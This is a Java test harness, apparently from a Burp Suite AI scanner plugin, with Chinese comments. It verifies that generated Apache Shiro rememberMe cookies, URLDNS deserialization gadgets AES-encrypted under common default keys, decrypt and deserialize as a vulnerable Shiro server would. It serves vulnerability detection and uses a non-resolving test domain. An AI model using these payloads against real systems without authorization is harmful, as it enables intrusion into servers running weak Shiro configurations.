/*
 * Zack-AI-Scanner —— Burp Suite 的 AI 智能漏洞扫描插件
 * Copyright (C) 2026 Zack AI Scanner
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */
package com.zackai.core;

import java.io.ByteArrayInputStream;
import java.io.ObjectInputStream;
import java.net.URL;
import java.util.Base64;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * ShiroPayload 验证程序（不入 jar；Maven 只编译不自动运行）。
 *
 * <pre>
 *   mvn -q clean test-compile
 *   CP="target/classes:target/test-classes:$(mvn -q dependency:build-classpath -Dmdep.outputFile=/dev/stdout -Dmdep.includeScope=provided)"
 *   java -Djava.awt.headless=true -cp "$CP" com.zackai.core.ShiroHarness
 * </pre>
 *
 * <p>全程离线、不碰网络：断言的是「生成的 rememberMe 值能被目标端那套逻辑（Base64 → AES 解密 →
 * ObjectInputStream 反序列化）吃下去，并且反序列化出来的 URL 就是我们这次的域名」。
 * 反序列化本身会真的发起一次 DNS 解析（URLDNS 的核心），所以域名一律用永不解析的 {@code .invalid}。
 */
public class ShiroHarness {

    static int passed = 0;
    static int failed = 0;

    static void check(String name, boolean ok, String detail) {
        if (ok) {
            ++passed;
            System.out.println("  ✅ " + name);
        } else {
            ++failed;
            System.out.println("  ❌ " + name + "  <- " + detail);
        }
    }

    public static void main(String[] args) throws Exception {
        final String host = "3f9ac1d2.oob-test.invalid";
        String key = ShiroPayload.defaultKeys()[0];

        System.out.println("\n--- gadget 模板 ---");
        byte[] gadget = ShiroPayload.urlDnsGadget(host);
        check("模板能生成字节流", gadget != null && gadget.length > 200,
                String.valueOf(gadget == null ? null : gadget.length));
        check("占位符偏移没有漂移（模板与常量必须一致）",
                ShiroPayload.TEMPLATE_HOST_OFFSET > 0
                        && new String(gadget, "UTF-8").contains(host),
                "偏移常量=" + ShiroPayload.TEMPLATE_HOST_OFFSET);
        Map<?, ?> map = deserialize(gadget);
        check("目标端反序列化得到 HashMap（1 个条目）", map != null && map.size() == 1, String.valueOf(map));
        if (map != null && map.size() == 1) {
            Object k = map.keySet().iterator().next();
            check("键是 java.net.URL", k instanceof URL, String.valueOf(k));
            check("URL 主机名就是本次请求的域名",
                    k instanceof URL && host.equals(((URL) k).getHost()), String.valueOf(k));
        }

        System.out.println("\n--- rememberMe 值（Base64 + AES-CBC，wire 格式 = IV ‖ 密文） ---");
        String value = ShiroPayload.rememberMeValue(host, key);
        check("能生成 cookie 值", value != null && value.length() > 40, String.valueOf(value));
        byte[] wire = Base64.getDecoder().decode(value);
        // 这一条是 2026-09-22 那个 bug 的回归断言：少了 IV 前缀时，
        // Shiro 会把密文前 16 字节当 IV → 解出垃圾 → 载荷在任何目标上都不生效
        check("前 16 字节就是 IV（= 密钥前 16 字节）—— Shiro 解密时就把它们当 IV 用",
                wire.length > 16 && java.util.Arrays.equals(java.util.Arrays.copyOf(wire, 16),
                        java.util.Arrays.copyOf(Base64.getDecoder().decode(key), 16)),
                "缺少 IV 前缀或前缀不对");
        check("wire 总长 = 16(IV) + 补齐到 16 字节整数倍的密文",
                wire.length > 16 && (wire.length - 16) % 16 == 0, "长度 " + wire.length);
        byte[] decrypted = decrypt(key, wire);
        check("按 Shiro 的方式能解回来（前 16 字节当 IV、其余当密文）", decrypted != null,
                "AES 解密失败");
        Map<?, ?> fromCookie = decrypted == null ? null : deserialize(decrypted);
        check("解回来的字节能反序列化成同样的 URLDNS 载荷",
                fromCookie != null && fromCookie.size() == 1
                        && host.equals(((URL) fromCookie.keySet().iterator().next()).getHost()),
                String.valueOf(fromCookie));

        System.out.println("\n--- 标记载荷展开 ---");
        String marker = ShiroPayload.MARKER_PREFIX + key + "}}";
        check("认出标记载荷", ShiroPayload.hasMarker(marker), "没认出来");
        check("普通载荷不会被当成标记",
                !ShiroPayload.hasMarker("rememberMe=probe"), "误判了");
        String bare = ShiroPayload.expand(marker, host);
        check("裸标记 → cookie 值", value.equals(bare), bare);
        String withName = ShiroPayload.expand("rememberMe=" + marker, host);
        check("带 cookie 名的标记 → rememberMe=<值>", ("rememberMe=" + value).equals(withName), withName);
        String multi = ShiroPayload.expand(
                marker + ";" + ShiroPayload.MARKER_PREFIX + ShiroPayload.defaultKeys()[1] + "}}", host);
        check("一条载荷里多个标记都会被展开",
                multi.contains(";") && !ShiroPayload.hasMarker(multi), multi);

        System.out.println("\n--- 失败路径必须是原样返回（不能把半成品发出去） ---");
        check("没拿到回连域名 → 原样返回", marker.equals(ShiroPayload.expand(marker, null)), "被改写了");
        String badKey = ShiroPayload.MARKER_PREFIX + "notbase64!!" + "}}";
        check("密钥不是合法 Base64 → 原样返回", badKey.equals(ShiroPayload.expand(badKey, host)), "被改写了");
        String shortKey = ShiroPayload.MARKER_PREFIX + "YWJj" + "}}";
        check("密钥长度不对 → 原样返回", shortKey.equals(ShiroPayload.expand(shortKey, host)), "被改写了");
        String unclosed = "{{SHIRO_URLLDNS:" + key;
        check("标记没闭合 → 原样返回", unclosed.equals(ShiroPayload.expand(unclosed, host)), "被改写了");
        check("非标记载荷原样返回",
                "rememberMe=probe".equals(ShiroPayload.expand("rememberMe=probe", host)), "被改写了");
        check("常见密钥都是 16 字节的合法 Base64",
                allKeysValid(), "有密钥不合法");

        System.out.println("\n========================================");
        System.out.println("通过 " + passed + " 项，失败 " + failed + " 项");
        System.exit(failed == 0 ? 0 : 1);
    }

    private static boolean allKeysValid() {
        for (String key : ShiroPayload.defaultKeys()) {
            try {
                if (Base64.getDecoder().decode(key).length != 16) return false;
            }
            catch (Exception e) {
                return false;
            }
        }
        return true;
    }

    private static Map<?, ?> deserialize(byte[] data) {
        try (ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(data))) {
            Object obj = in.readObject();
            return obj instanceof Map ? (Map<?, ?>) obj : null;
        }
        catch (Exception e) {
            System.out.println("     （反序列化失败：" + e.getClass().getSimpleName() + " " + e.getMessage() + "）");
            return null;
        }
    }

    /**
     * 按**目标端 Shiro 的方式**解密：{@code JcaCipherService}（默认 generateInitializationVectors=true）
     * 把输入的前 16 字节当 IV，剩下的才是密文。
     *
     * <p>旧版本这里是「IV = 密钥 + 整段输入当密文」—— 与生成端共用同一套错误约定，
     * 所以「缺 IV 前缀」这种让载荷在任何目标上都不生效的 bug，它能一直通过。
     */
    private static byte[] decrypt(String keyBase64, byte[] wire) {
        try {
            byte[] key = Base64.getDecoder().decode(keyBase64);
            if (wire == null || wire.length <= 16) return null;
            byte[] iv = java.util.Arrays.copyOf(wire, 16);
            byte[] cipherText = java.util.Arrays.copyOfRange(wire, 16, wire.length);
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new IvParameterSpec(iv));
            return cipher.doFinal(cipherText);
        }
        catch (Exception e) {
            return null;
        }
    }
}
